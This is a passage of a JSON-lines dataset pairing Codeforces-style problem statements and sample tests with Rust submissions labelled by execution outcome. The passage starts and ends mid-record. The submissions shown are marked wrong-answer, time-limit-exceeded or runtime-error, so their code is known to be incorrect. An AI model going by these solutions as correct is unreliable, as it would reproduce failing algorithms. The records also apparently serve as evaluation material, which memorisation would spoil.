ModInt(1);\n        let mut s = *self;\n        let mut n = n;\n        while n > 0 {\n            if n & 1 == 1 {\n                t = t * s;\n            }\n            s = s * s;\n            n >>= 1;\n        }\n        t\n    }\n    fn inv(&self) -> Self {\n        assert!(self.0 > 0);\n        self.pow(MOD - 2)\n    }\n}\n\npub const BASE_NUM: usize = 2;\n\n#[derive(Clone, PartialEq, Eq)]\npub struct ModVector {\n    val: [ModInt; BASE_NUM],\n}\n\nimpl ModVector {\n    pub fn zero() -> Self {\n        ModVector {\n            val: [ModInt::zero(); BASE_NUM],\n        }\n    }\n    pub fn new(v: &[u64]) -> Self {\n        assert!(v.len() >= BASE_NUM);\n        let mut ans = ModVector::zero();\n        for (x, a) in ans.val.iter_mut().zip(v.iter()) {\n            *x = ModInt::new(*a);\n        }\n        ans\n    }\n    pub fn one(v: u64) -> Self {\n        ModVector::new(&[v; BASE_NUM])\n    }\n    pub fn add(&self, rhs: &Self) -> Self {\n        let mut ans = ModVector::zero();\n        for (c, (a, b)) in ans.val.iter_mut().zip(self.val.iter().zip(rhs.val.iter())) {\n            *c = *a + *b;\n        }\n        ans\n    }\n    pub fn sub(&self, rhs: &Self) -> Self {\n        let mut ans = ModVector::zero();\n        for (c, (a, b)) in ans.val.iter_mut().zip(self.val.iter().zip(rhs.val.iter())) {\n            *c = *a - *b;\n        }\n        ans\n    }\n    pub fn mul(&self, rhs: &Self) -> Self {\n        let mut ans = ModVector::zero();\n        for (c, (a, b)) in ans.val.iter_mut().zip(self.val.iter().zip(rhs.val.iter())) {\n            *c = *a * *b;\n        }\n        ans\n    }\n    pub fn inv(&self) -> Self {\n        let mut ans = ModVector::zero();\n        for (x, a) in ans.val.iter_mut().zip(self.val.iter()) {\n            *x = a.inv();\n        }\n        ans\n    }\n}\n\npub fn rand_time() -> u32 {\n    use std::time::{SystemTime, UNIX_EPOCH};\n    SystemTime::now().duration_since(UNIX_EPOCH).unwrap().subsec_nanos()\n}\n\npub fn rand_memory() -> u32 {\n    Box::into_raw(Box::new(\"I hope this is a random number\")) as u32\n}\n\nuse std::io::Read;\nuse std::io::Write;\n\nfn run() {\n    let mut s = String::new();\n    std::io::stdin().read_to_string(&mut s).unwrap();\n    let mut it = s.trim().split_whitespace();\n    let n: usize = it.next().unwrap().parse().unwrap();\n    let t: Vec<u32> = it.next().unwrap().chars().map(|c| c.to_digit(10).unwrap()).collect();\n    let rad = ModVector::new(&vec![rand_time() as u64, rand_memory() as u64]);\n    let inv = rad.inv();\n    let mut pow = vec![ModVector::new(&[1, 1])];\n    for _ in 0..n {\n        let v = pow.last().unwrap().mul(&rad);\n        pow.push(v);\n    }\n    type T = (ModVector, usize, bool, bool);\n    let fold = |a: T, b: T| -> T {\n        if a.1 == 0 {\n            return b;\n        }\n        if b.1 == 0 {\n            return a;\n        }\n        if a.3 && b.2 {\n            let mut val = a.0.sub(&ModVector::one(2).mul(&pow[a.1 - 1]));\n            val = val.add(&pow[a.1 - 1].mul(&inv.mul(&b.0.sub(&ModVector::one(2)))));\n            let len = a.1 + b.1 - 2;\n            match (a.1 == 1, b.1 == 1) {\n                (true, true) => (val, len, false, false),\n                (true, false) => (val, len, a.2, false),\n                (false, true) => (val, len, false, b.3),\n                (false, false) => (val, len, a.2, b.3),\n            }\n        } else {\n            let val = a.0.add(&b.0.mul(&pow[a.1]));\n            let len = a.1 + b.1;\n            (val, len, a.2, b.3)\n        }\n    };\n    let mut seg = segment_tree::PURQ::new(n, (ModVector::zero(), 0, false, false), fold);\n    for (i, &c) in t.iter().enumerate() {\n        if c == 1 {\n            seg.update_tmp(i, (ModVector::one(2), 1, true, true));\n        } else {\n            seg.update_tmp(i, (ModVector::one(1), 1, false, false));\n        }\n    }\n    seg.update_all();\n    let q: usize = it.next().unwrap().parse().unwrap();\n    let out = std::io::stdout();\n    let mut out = std::io::BufWriter::new(out.lock());\n    for _ in 0..q {\n        let a: usize = it.next().unwrap().parse().unwrap();\n        let b: usize = it.next().unwrap().parse().unwrap();\n        let len: usize = it.next().unwrap().parse().unwrap();\n        let ans = if seg.find(a - 1, a - 1 + len) == seg.find(b - 1, b - 1 + len) {\n            \"Yes\"\n        } else {\n            \"No\"\n        };\n        writeln!(out, \"{}\", ans).ok();\n    }\n}\n\nfn main() {\n    run();\n}\n","description":"In this problem, we will deal with binary strings. Each character of a binary string is either a 0 or a 1. We will also deal with substrings; recall that a substring is a contiguous subsequence of a string. We denote the substring of string $$$s$$$ starting from the $$$l$$$-th character and ending with the $$$r$$$-th character as $$$s[l \\dots r]$$$. The characters of each string are numbered from $$$1$$$.We can perform several operations on the strings we consider. Each operation is to choose a substring of our string and replace it with another string. There are two possible types of operations: replace 011 with 110, or replace 110 with 011. For example, if we apply exactly one operation to the string 110011110, it can be transformed into 011011110, 110110110, or 110011011.Binary string $$$a$$$ is considered reachable from binary string $$$b$$$ if there exists a sequence $$$s_1$$$, $$$s_2$$$, ..., $$$s_k$$$ such that $$$s_1 = a$$$, $$$s_k = b$$$, and for every $$$i \\in [1, k - 1]$$$, $$$s_i$$$ can be transformed into $$$s_{i + 1}$$$ using exactly one operation. Note that $$$k$$$ can be equal to $$$1$$$, i.\u2009e., every string is reachable from itself.You are given a string $$$t$$$ and $$$q$$$ queries to it. Each query consists of three integers $$$l_1$$$, $$$l_2$$$ and $$$len$$$. To answer each query, you have to determine whether $$$t[l_1 \\dots l_1 + len - 1]$$$ is reachable from $$$t[l_2 \\dots l_2 + len - 1]$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains one integer $$$n$$$ ($$$1 \\le n \\le 2 \\cdot 10^5$$$) \u2014 the length of string $$$t$$$. The second line contains one string $$$t$$$ ($$$|t| = n$$$). Each character of $$$t$$$ is either 0 or 1. The third line contains one integer $$$q$$$ ($$$1 \\le q \\le 2 \\cdot 10^5$$$) \u2014 the number of queries. Then $$$q$$$ lines follow, each line represents a query. The $$$i$$$-th line contains three integers $$$l_1$$$, $$$l_2$$$ and $$$len$$$ ($$$1 \\le l_1, l_2 \\le |t|$$$, $$$1 \\le len \\le |t| - \\max(l_1, l_2) + 1$$$) for the $$$i$$$-th query.","output_spec":"For each query, print either YES if $$$t[l_1 \\dots l_1 + len - 1]$$$ is reachable from $$$t[l_2 \\dots l_2 + len - 1]$$$, or NO otherwise. You may print each letter in any register.","notes":null,"sample_inputs":["5\n11011\n3\n1 3 3\n1 4 2\n1 2 3"],"sample_outputs":["Yes\nYes\nNo"]}
{"difficulty":1600,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"70_B","submission_id":"171167452","tags":["expression+parsing","greedy","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#![allow(non_snake_case)]\r\n#[allow(dead_code)] fn read_line() -> String { let mut buffer = String::new(); std::io::stdin().read_line(&mut buffer).expect(\"failed to read line\"); buffer.trim().to_string() }\r\n#[allow(dead_code)] fn read<T : std::str::FromStr>() -> T where T::Err: std::fmt::Debug { read_line().trim().parse::<T>().expect(\"failed to read value\") }\r\n#[allow(dead_code)]fn read_vec<T : std::str::FromStr>() -> Vec<T> where T::Err: std::fmt::Debug { read_line().split_whitespace().map(|x| x.parse::<T>().expect(\"failed to read values\")).collect() }\r\n#[allow(dead_code)] fn lock_stdout() -> std::io::BufWriter<std::io::StdoutLock<'static>> { let stdout = std::io::stdout().lock(); std::io::BufWriter::new(stdout) }\r\n#[allow(dead_code)] struct StdoutLogger {buf: std::io::BufWriter<std::io::StdoutLock<'static>>}impl StdoutLogger {fn log(&mut self, s: &str) {std::io::Write::write(&mut self.buf, s.as_bytes()).expect(\"error writing stdout\");std::io::Write::write(&mut self.buf, \"\\n\".as_bytes()).expect(\"error writing stdout\");}}\r\n#[allow(dead_code)] macro_rules! init {($name: ident) => {#[allow(unused_mut)]let mut $name = StdoutLogger{buf:lock_stdout()};}}\r\n\r\nfn main() {\r\n    init!(outp);\r\n\r\n\r\n    let n = read::<usize>();\r\n    let inp = read_line();\r\n\r\n\r\n    \/\/ let n = 2;\r\n    \/\/ let inp = \"How are you?\";\r\n\r\n    \/\/ let n = 25;\r\n    \/\/ let inp = \"Hello! Do you like fish? Why?\";\r\n\r\n\r\n    let sntncs = inp.split(['.', '?', '!']);\r\n    let mut cnt = 1;\r\n    let mut sntnc_c = 0;\r\n    let mut p = 0;\r\n    for sntnc in sntncs {\r\n        if sntnc.len()==0 {continue};\r\n        \/\/ println!(\"sntnc:{sntnc} len:{}\", sntnc.len());\r\n        if p+sntnc.len()+1<=n {\r\n            sntnc_c += 1;\r\n            \/\/ println!(\"+{}\", &inp[p..p+sntnc.len()+1]);\r\n            p += sntnc.len()+1;\r\n        } else {\r\n            if sntnc_c==0 {\r\n                println!(\"Impossible\");\r\n                return;\r\n            }\r\n            \/\/ println!(\"|{}\", &inp[p..p+sntnc.len()+1]);\r\n            p += sntnc.len()+1;\r\n            cnt += 1;\r\n        }\r\n    }\r\n    println!(\"{cnt}\");\r\n\r\n}\r\n","description":"Fangy the little walrus, as all the modern walruses, loves to communicate via text messaging. One day he faced the following problem: When he sends large texts, they are split into parts each containing n characters (which is the size of one text message). Thus, whole sentences and words get split!Fangy did not like it, so he faced the task of breaking the text into minimal messages on his own so that no sentence were broken into pieces when it is sent and the number of text messages to be sent would be minimal. If two consecutive sentences are in different messages, the space between them can be ignored (Fangy does not write this space).The little walrus's text looks in the following manner: TEXT ::= SENTENCE | SENTENCE SPACE TEXTSENTENCE ::= WORD SPACE SENTENCE | WORD ENDEND ::= {'.', '?', '!'}WORD ::= LETTER | LETTER WORDLETTER ::= {'a'..'z', 'A'..'Z'}SPACE ::= ' 'SPACE stands for the symbol of a space.So, how many messages did Fangy send?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n, which is the size of one message (2\u2264n\u2264255). The second line contains the text. The length of the text does not exceed 10^4 characters. It is guaranteed that the text satisfies the above described format. Specifically, this implies that the text is not empty.\n","output_spec":"On the first and only line print the number of text messages Fangy will need. If it is impossible to split the text, print \"Impossible\" without the quotes.\n","notes":"Let's take a look at the third sample. The text will be split into three messages: \"Hello!\", \"Do you like fish?\" and \"Why?\".\n","sample_inputs":["25\nHello. I am a little walrus.\n","2\nHow are you?\n","19\nHello! Do you like fish? Why?\n"],"sample_outputs":["2\n","Impossible\n","3\n"]}
{"difficulty":2200,"lang":"Rust","lang_cluster":"rust","src_uid":"7225266f663699ff7e16b726cadfe9ee","submission_id":"4094ce72d6499e2ce7819a901d7b495f","tags":["implementation","greedy","math","brute force"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"\/\/ ---------- begin input macro ----------\n\/\/ reference: https:\/\/qiita.com\/tanakh\/items\/0ba42c7ca36cd29d0ac8\nmacro_rules! input {\n    (source = $s:expr, $($r:tt)*) => {\n        let mut iter = $s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n    ($($r:tt)*) => {\n        let s = {\n            use std::io::Read;\n            let mut s = String::new();\n            std::io::stdin().read_to_string(&mut s).unwrap();\n            s\n        };\n        let mut iter = s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n}\n\nmacro_rules! input_inner {\n    ($iter:expr) => {};\n    ($iter:expr, ) => {};\n    ($iter:expr, $var:ident : $t:tt $($r:tt)*) => {\n        let $var = read_value!($iter, $t);\n        input_inner!{$iter $($r)*}\n    };\n}\n\nmacro_rules! read_value {\n    ($iter:expr, ( $($t:tt),* )) => {\n        ( $(read_value!($iter, $t)),* )\n    };\n    ($iter:expr, [ $t:tt ; $len:expr ]) => {\n        (0..$len).map(|_| read_value!($iter, $t)).collect::<Vec<_>>()\n    };\n    ($iter:expr, chars) => {\n        read_value!($iter, String).chars().collect::<Vec<char>>()\n    };\n    ($iter:expr, bytes) => {\n        read_value!($iter, String).bytes().collect::<Vec<u8>>()\n    };\n    ($iter:expr, usize1) => {\n        read_value!($iter, usize) - 1\n    };\n    ($iter:expr, $t:ty) => {\n        $iter.next().unwrap().parse::<$t>().expect(\"Parse error\")\n    };\n}\n\/\/ ---------- end input macro ----------\n\nfn run() {\n    input! {\n        m: u64,\n        xaniar: (usize, usize, u64, u64),\n        abol: (usize, usize, u64, u64),\n    }\n    let cond = |b: bool| {\n        if !b {\n            println!(\"-1\");\n            std::process::exit(0);\n        }\n    };\n    let next = |h: usize| -> usize {\n        let x = xaniar.2;\n        let y = xaniar.3;\n        ((h as u64 * x + y) % m) as usize\n    };\n    let mut time = vec![None; m as usize];\n    let mut p = xaniar.0;\n    time[p] = Some(0);\n    let mut k = 1;\n    p = next(p);\n    while time[p].is_none() {\n        time[p] = Some(k);\n        k += 1;\n        p = next(p);\n    }\n    let step = k - time[p].unwrap();\n    let a = xaniar.1;\n    cond(time[a].is_some());\n    if time[a].unwrap() < time[p].unwrap() {\n        let next = |h: usize| -> usize {\n            let x = abol.2;\n            let y = abol.3;\n            ((h as u64 * x + y) % m) as usize\n        };\n        let t = time[a].unwrap();\n        let mut p = abol.0;\n        for _ in 0..t {\n            p = next(p);\n        }\n        cond(p == abol.1);\n        println!(\"{}\", t);\n        return;\n    }\n    let t = time[a].unwrap();\n    let mut abol = abol;\n    for _ in 0..t {\n        abol.0 = {\n            let x = abol.2;\n            let y = abol.3;\n            ((abol.0 as u64 * x + y) % m) as usize\n        };\n    }\n    let mut mat = (1, 0);\n    for _ in 0..step {\n        mat = (mat.0 * abol.2 % m, (mat.1 * abol.2 + abol.3) % m);\n    }\n    abol.2 = mat.0;\n    abol.3 = mat.1;\n    let mut time = vec![None; m as usize];\n    let next = |h: usize| -> usize {\n        let x = abol.2;\n        let y = abol.3;\n        ((h as u64 * x + y) % m) as usize\n    };\n    let mut p = abol.0;\n    time[abol.0] = Some(0);\n    p = next(p);\n    let mut k = 1;\n    while time[p].is_some() {\n        time[p] = Some(k);\n        p = next(p);\n        k += 1;\n    }\n    cond(time[abol.1].is_some());\n    let ans = time[abol.1].unwrap() as u64 * step as u64 + t as u64;\n    println!(\"{}\", ans);\n}\n\nfn main() {\n    run();\n}\n","description":"Mike has a frog and a flower. His frog is named Xaniar and his flower is named Abol. Initially(at time 0), height of Xaniar is h1 and height of Abol is h2. Each second, Mike waters Abol and Xaniar.  So, if height of Xaniar is h1 and height of Abol is h2, after one second height of Xaniar will become  and height of Abol will become  where x1,\u2009y1,\u2009x2 and y2 are some integer numbers and  denotes the remainder of a modulo b.Mike is a competitive programmer fan. He wants to know the minimum time it takes until height of Xania is a1 and height of Abol is a2.Mike has asked you for your help. Calculate the minimum time or say it will never happen.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of input contains integer m (2\u2009\u2264\u2009m\u2009\u2264\u2009106). The second line of input contains integers h1 and a1 (0\u2009\u2264\u2009h1,\u2009a1\u2009&lt;\u2009m). The third line of input contains integers x1 and y1 (0\u2009\u2264\u2009x1,\u2009y1\u2009&lt;\u2009m). The fourth line of input contains integers h2 and a2 (0\u2009\u2264\u2009h2,\u2009a2\u2009&lt;\u2009m). The fifth line of input contains integers x2 and y2 (0\u2009\u2264\u2009x2,\u2009y2\u2009&lt;\u2009m). It is guaranteed that h1\u2009\u2260\u2009a1 and h2\u2009\u2260\u2009a2.","output_spec":"Print the minimum number of seconds until Xaniar reaches height a1 and Abol reaches height a2 or print -1 otherwise.","notes":"NoteIn the first sample, heights sequences are following:Xaniar: Abol: ","sample_inputs":["5\n4 2\n1 1\n0 1\n2 3","1023\n1 2\n1 0\n1 2\n1 1"],"sample_outputs":["3","-1"]}
{"difficulty":2000,"lang":"Rust","lang_cluster":"rust","src_uid":"75ec99318736a8a1b62a8d51efd95355","submission_id":"526450099d418b9b218ce60a5efda6bd","tags":["combinatorics","greedy","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"fn main() {\n\n    use std::io::{self, Read};\n    use std::cmp::Ordering;\n    use std::collections::{HashMap,HashSet};\n    use std::mem;\n    \n    let mut buffer = String::new();\n    let stdin = io::stdin();\n    let mut handle = stdin.lock();\n\n    handle.read_to_string(&mut buffer).unwrap();\n\n    let input_strs = buffer.split_whitespace().take(3).map( |x| x.parse::<i64>().unwrap() ).collect::< Vec<i64> >();\n\n    let n = *input_strs.iter().nth(0).unwrap();\n\n    let mut hs = HashSet::new();\n    hs.insert(0);\n\n    let mut dp_count = HashMap::new();\n    \n    \/\/strategy: use dp and the number of additional unique values added per round tops off at some point for value denominations of 1, 5, 10, 50\n    \/\/ so use that value for bigger number of rounds\n    for i in 0..13 {\n        let mut temp = HashSet::new();\n        for j in hs.iter() {\n            temp.insert( *j + 1 );\n            temp.insert( *j + 5 );\n            temp.insert( *j + 10 );\n            temp.insert( *j + 50 );\n        }\n        mem::swap( & mut temp, & mut hs );\n        let count = hs.len();\n        dp_count.insert(i+1, count);\n    }\n\n    let ans = if n <= 12 {\n        *dp_count.get(&n).expect(\"dp_count\")\n    } else {\n        let increment = *dp_count.get(&12).unwrap() - *dp_count.get(&11).unwrap();\n        *dp_count.get(&12).unwrap() + (n as usize - 12) * increment\n    };\n    println!( \"{}\", ans );\n}\n","description":"Let's introduce a number system which is based on a roman digits. There are digits I, V, X, L which correspond to the numbers $$$1$$$, $$$5$$$, $$$10$$$ and $$$50$$$ respectively. The use of other roman digits is not allowed.Numbers in this system are written as a sequence of one or more digits. We define the value of the sequence simply as the sum of digits in it.For example, the number XXXV evaluates to $$$35$$$ and the number IXI\u00a0\u2014 to $$$12$$$.Pay attention to the difference to the traditional roman system\u00a0\u2014 in our system any sequence of digits is valid, moreover the order of digits doesn't matter, for example IX means $$$11$$$, not $$$9$$$.One can notice that this system is ambiguous, and some numbers can be written in many different ways. Your goal is to determine how many distinct integers can be represented by exactly $$$n$$$ roman digits I, V, X, L.","input_from":"standard input","output_to":"standard output","input_spec":"The only line of the input file contains a single integer $$$n$$$ ($$$1 \\le n \\le 10^9$$$)\u00a0\u2014 the number of roman digits to use.","output_spec":"Output a single integer\u00a0\u2014 the number of distinct integers which can be represented using $$$n$$$ roman digits exactly.","notes":"NoteIn the first sample there are exactly $$$4$$$ integers which can be represented\u00a0\u2014 I, V, X and L.In the second sample it is possible to represent integers $$$2$$$ (II), $$$6$$$ (VI), $$$10$$$ (VV), $$$11$$$ (XI), $$$15$$$ (XV), $$$20$$$ (XX), $$$51$$$ (IL), $$$55$$$ (VL), $$$60$$$ (XL) and $$$100$$$ (LL).","sample_inputs":["1","2","10"],"sample_outputs":["4","10","244"]}
{"difficulty":2400,"lang":"Rust","lang_cluster":"rust","src_uid":"788cb3da98fd4a56720f800588061b79","submission_id":"re_1470","tags":["dp"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/ ---------- begin ModInt ----------\nconst MOD: u32 = 1_000_000_007;\n\n#[derive(Clone, Copy)]\nstruct ModInt(u32);\n\nimpl std::ops::Add for ModInt {\n    type Output = ModInt;\n    fn add(self, rhs: ModInt) -> Self::Output {\n        let mut d = self.0 + rhs.0;\n        if d >= MOD {\n            d -= MOD;\n        }\n        ModInt(d)\n    }\n}\n\nimpl std::ops::AddAssign for ModInt {\n    fn add_assign(&mut self, rhs: ModInt) {\n        *self = *self + rhs;\n    }\n}\n\nimpl std::ops::Sub for ModInt {\n    type Output = ModInt;\n    fn sub(self, rhs: ModInt) -> Self::Output {\n        let mut d = self.0 + MOD - rhs.0;\n        if d >= MOD {\n            d -= MOD;\n        }\n        ModInt(d)\n    }\n}\n\nimpl std::ops::SubAssign for ModInt {\n    fn sub_assign(&mut self, rhs: ModInt) {\n        *self = *self - rhs;\n    }\n}\n\nimpl std::ops::Mul for ModInt {\n    type Output = ModInt;\n    fn mul(self, rhs: ModInt) -> Self::Output {\n        ModInt((self.0 as u64 * rhs.0 as u64 % MOD as u64) as u32)\n    }\n}\n\nimpl std::ops::MulAssign for ModInt {\n    fn mul_assign(&mut self, rhs: ModInt) {\n        *self = *self * rhs;\n    }\n}\n\nimpl std::ops::Neg for ModInt {\n    type Output = ModInt;\n    fn neg(self) -> Self::Output {\n        ModInt(if self.0 == 0 {0} else {MOD - self.0})\n    }\n}\n\nimpl std::fmt::Display for ModInt {\n    fn fmt<'a>(&self, f: &mut std::fmt::Formatter<'a>) -> std::fmt::Result {\n        write!(f, \"{}\", self.0)\n    }\n}\n\nimpl std::str::FromStr for ModInt {\n    type Err = std::num::ParseIntError;\n    fn from_str(s: &str) -> Result<Self, Self::Err> {\n        let val = s.parse::<u32>()?;\n        Ok(ModInt::new(val))\n    }\n}\n\nimpl From<usize> for ModInt {\n    fn from(val: usize) -> Self {\n        ModInt((val % MOD as usize) as u32)\n    }\n}\n\n#[allow(dead_code)]\nimpl ModInt {\n    pub fn new(n: u32) -> ModInt {\n        ModInt(n % MOD)\n    }\n    pub fn zero() -> ModInt {\n        ModInt(0)\n    }\n    pub fn one() -> ModInt {\n        ModInt(1)\n    }\n    pub fn pow(self, mut n: u32) -> ModInt {\n        let mut t = ModInt::one();\n        let mut s = self;\n        while n > 0 {\n            if n & 1 == 1 {\n                t *= s;\n            }\n            s *= s;\n            n >>= 1;\n        }\n        t\n    }\n    pub fn inv(self) -> ModInt {\n        assert!(self.0 > 0);\n        self.pow(MOD - 2)\n    }\n}\n\/\/ ---------- end ModInt ----------\n\/\/ ---------- begin Precalc ----------\n#[allow(dead_code)]\nstruct Precalc {\n    inv: Vec<ModInt>,\n    fact: Vec<ModInt>,\n    ifact: Vec<ModInt>,\n}\n\n#[allow(dead_code)]\nimpl Precalc {\n    pub fn new(n: usize) -> Precalc {\n        let mut inv = vec![ModInt::one(); n + 1];\n        let mut fact = vec![ModInt::one(); n + 1];\n        let mut ifact = vec![ModInt::one(); n + 1];\n        for i in 2..(n + 1) {\n            inv[i] = -inv[MOD as usize % i] * ModInt(MOD \/ i as u32);\n            fact[i] = fact[i - 1] * ModInt(i as u32);\n            ifact[i] = ifact[i - 1] * inv[i];\n        }\n        Precalc {\n            inv: inv,\n            fact: fact,\n            ifact: ifact,\n        }\n    }\n    pub fn inv(&self, n: usize) -> ModInt {\n        self.inv[n]\n    }\n    pub fn fact(&self, n: usize) -> ModInt {\n        self.fact[n]\n    }\n    pub fn ifact(&self, n: usize) -> ModInt {\n        self.ifact[n]\n    }\n    pub fn comb(&self, n: usize, k: usize) -> ModInt {\n        if k > n {\n            return ModInt::zero();\n        }\n        self.fact[n] * self.ifact[k] * self.ifact[n - k]\n    }\n}\n\/\/ ---------- end Precalc ----------\n\/\/https:\/\/qiita.com\/tanakh\/items\/0ba42c7ca36cd29d0ac8 \u3088\u308a\nmacro_rules! input {\n    (source = $s:expr, $($r:tt)*) => {\n        let mut iter = $s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n    ($($r:tt)*) => {\n        let s = {\n            use std::io::Read;\n            let mut s = String::new();\n            std::io::stdin().read_to_string(&mut s).unwrap();\n            s\n        };\n        let mut iter = s.split_whitespace();\n        input_inner!{iter, $($r)*}\n    };\n}\n\nmacro_rules! input_inner {\n    ($iter:expr) => {};\n    ($iter:expr, ) => {};\n    ($iter:expr, $var:ident : $t:tt $($r:tt)*) => {\n        let $var = read_value!($iter, $t);\n        input_inner!{$iter $($r)*}\n    };\n}\n\nmacro_rules! read_value {\n    ($iter:expr, ( $($t:tt),* )) => {\n        ( $(read_value!($iter, $t)),* )\n    };\n    ($iter:expr, [ $t:tt ; $len:expr ]) => {\n        (0..$len).map(|_| read_value!($iter, $t)).collect::<Vec<_>>()\n    };\n    ($iter:expr, chars) => {\n        read_value!($iter, String).chars().collect::<Vec<char>>()\n    };\n    ($iter:expr, usize1) => {\n        read_value!($iter, usize) - 1\n    };\n    ($iter:expr, $t:ty) => {\n        $iter.next().unwrap().parse::<$t>().expect(\"Parse error\")\n    };\n}\n\n\/\/\n\nfn run() {\n    input! {\n        n: usize,\n        w: usize,\n        a: [usize; n],\n    }\n    let mut a = a;\n    a.sort();\n    let mut dp = vec![vec![ModInt::zero(); w + 1]; 2];\n    dp[0][0] = ModInt::one();\n    dp[1][0] = ModInt::one();\n    for d in a.windows(2) {\n        let d = d[1] - d[0];\n        let mut next = vec![vec![ModInt::zero(); w + 1]; dp.len() + 1];\n        \/\/ \u5358\u4f53\n        for (i, dp) in dp.iter().enumerate() {\n            let next = &mut next[i];\n            for (j, &v) in dp.iter().enumerate() {\n                if let Some(p) = next.get_mut(j + i * d) {\n                    *p += v;\n                } else {\n                    break;\n                }\n            }\n        }\n        \/\/ \u9589\u3058\u308b\n        for (i, dp) in dp.iter().enumerate().skip(1) {\n            let next = &mut next[i - 1];\n            for (j, &v) in dp.iter().enumerate() {\n                if let Some(p) = next.get_mut(j + i * d) {\n                    *p += v;\n                } else {\n                    break;\n                }\n            }\n        }\n        \/\/ \u5272\u308a\u5f53\u3066\n        for (i, dp) in dp.iter().enumerate().skip(1) {\n            let next = &mut next[i];\n            for (j, &v) in dp.iter().enumerate() {\n                if let Some(p) = next.get_mut(j + i * d) {\n                    *p += ModInt::from(i) * v;\n                } else {\n                    break;\n                }\n            }\n        }\n        \/\/ \u958b\u304f\n        for (i, dp) in dp.iter().enumerate() {\n            let next = &mut next[i + 1];\n            for (j, &v) in dp.iter().enumerate() {\n                if let Some(p) = next.get_mut(j + i * d) {\n                    *p += v;\n                } else {\n                    break;\n                }\n            }\n        }\n        dp = next;\n    }\n    let mut ans = ModInt::zero();\n    for a in dp[0].iter() {\n        ans += *a;\n    }\n    println!(\"{}\", ans);\n}\n\nfn main() {\n    run();\n}\n","description":"There are n students in a class working on group projects. The students will divide into groups (some students may be in groups alone), work on their independent pieces, and then discuss the results together. It takes the i-th student ai minutes to finish his\/her independent piece.If students work at different paces, it can be frustrating for the faster students and stressful for the slower ones. In particular, the imbalance of a group is defined as the maximum ai in the group minus the minimum ai in the group. Note that a group containing a single student has an imbalance of 0. How many ways are there for the students to divide into groups so that the total imbalance of all groups is at most k?Two divisions are considered distinct if there exists a pair of students who work in the same group in one division but different groups in the other.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u2009200, 0\u2009\u2264\u2009k\u2009\u2264\u20091000)\u00a0\u2014 the number of students and the maximum total imbalance allowed, respectively. The second line contains n space-separated integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009500)\u00a0\u2014 the time it takes the i-th student to complete his\/her independent piece of work.","output_spec":"Print a single integer, the number of ways the students can form groups. As the answer may be large, print its value modulo 109\u2009+\u20097.","notes":"NoteIn the first sample, we have three options:   The first and second students form a group, and the third student forms a group. Total imbalance is 2\u2009+\u20090\u2009=\u20092.  The first student forms a group, and the second and third students form a group. Total imbalance is 0\u2009+\u20091\u2009=\u20091.  All three students form their own groups. Total imbalance is 0. In the third sample, the total imbalance must be 0, so each student must work individually.","sample_inputs":["3 2\n2 4 5","4 3\n7 8 9 10","4 0\n5 10 20 21"],"sample_outputs":["3","13","1"]}
{"difficulty":1600,"lang":"Rust 2021","lang_cluster":"rust","src_uid":"95_A","submission_id":"171178351","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#![allow(non_snake_case)]\r\n#[allow(dead_code)] fn read_line() -> String { let mut buffer = String::new(); std::io::stdin().read_line(&mut buffer).expect(\"failed to read line\"); buffer.trim().to_string() }\r\n#[allow(dead_code)] fn read<T : std::str::FromStr>() -> T where T::Err: std::fmt::Debug { read_line().trim().parse::<T>().expect(\"failed to read value\") }\r\n#[allow(dead_code)]fn read_vec<T : std::str::FromStr>() -> Vec<T> where T::Err: std::fmt::Debug { read_line().split_whitespace().map(|x| x.parse::<T>().expect(\"failed to read values\")).collect() }\r\n#[allow(dead_code)] fn lock_stdout() -> std::io::BufWriter<std::io::StdoutLock<'static>> { let stdout = std::io::stdout().lock(); std::io::BufWriter::new(stdout) }\r\n#[allow(dead_code)] struct StdoutLogger {buf: std::io::BufWriter<std::io::StdoutLock<'static>>}impl StdoutLogger {fn log(&mut self, s: &str) {std::io::Write::write(&mut self.buf, s.as_bytes()).expect(\"error writing stdout\");std::io::Write::write(&mut self.buf, \"\\n\".as_bytes()).expect(\"error writing stdout\");}}\r\n#[allow(dead_code)] macro_rules! init {($name: ident) => {#[allow(unused_mut)]let mut $name = StdoutLogger{buf:lock_stdout()};}}\r\n\r\nfn main() {\r\n    init!(outp);\r\n\r\n\r\n    let excl_c = read::<usize>();\r\n    let excl_ws = (0..excl_c).map(|_| read_line()).collect::<Vec<_>>();\r\n    let excl_ws = excl_ws.iter().map(|s| s.as_str()).collect::<Vec<_>>();\r\n    let inp = read_line();\r\n    let the_ch = read_line().chars().next().unwrap();\r\n\r\n\r\n    \/\/ let excl_ws = vec![\r\n    \/\/     \"aCa\",\r\n    \/\/     \"cba\",\r\n    \/\/ ];\r\n    \/\/ let inp = \"abAcaba\";\r\n    \/\/ let the_ch = 'c';\r\n\r\n\r\n    let mut repl = vec![0; 100];\r\n    let inp_lc = inp.to_lowercase();\r\n    for &w in &excl_ws {\r\n        let mut p = 0;\r\n        while let Some(o) = inp_lc[p..].find(&w.to_lowercase()) {\r\n            for i in p+o..p+o+w.len() {repl[i]=1}\r\n            p += o + 1;\r\n        }\r\n    }\r\n    \r\n    fn match_case(ch: char, to_ch: char) -> char {\r\n        if to_ch.is_uppercase(){ch.to_uppercase().next().unwrap()}else{ch.to_lowercase().next().unwrap()}\r\n    }\r\n    let mut inp = inp.chars().collect::<Vec<_>>();\r\n    for i in 0..repl.len() {\r\n        if repl[i]==1 {\r\n            if inp[i]==the_ch {\r\n                inp[i] = match_case(if the_ch=='a'{'b'}else{'a'}, inp[i]);\r\n            } else {\r\n                inp[i] = match_case(the_ch, inp[i]);\r\n            }\r\n        }\r\n    }\r\n\r\n    \/\/println!(\"{inp:?}\");\r\n    println!(\"{}\", inp.iter().collect::<String>());\r\n}\r\n","description":"Petya loves hockey very much. One day, as he 